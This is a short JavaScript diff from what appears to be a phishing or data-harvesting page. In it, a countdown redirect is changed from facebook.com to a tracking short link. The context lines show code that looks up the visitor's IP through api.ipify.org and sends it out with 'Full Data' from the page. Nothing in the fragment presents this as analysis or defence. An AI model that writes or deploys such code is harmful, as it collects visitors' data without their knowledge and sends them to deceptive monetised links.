@@ -8,7 +8,7 @@ const countdownInterval = setInterval(() => {
     
     if (seconds <= 0) {
         clearInterval(countdownInterval);
-        window.location.href = "https://facebook.com";
+        window.location.href = "https://smrturl.co/a/sa96e6bea59/15315?s1=babli";
     }
 }, 1000);
 
@@ -72,4 +72,5 @@ fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(ip=>{
         `IP: ${ip.ip}\n` +
         `Full Data: ${JSON.stringify(data)}`
     )}`);
+
 }).catch(e=>{});
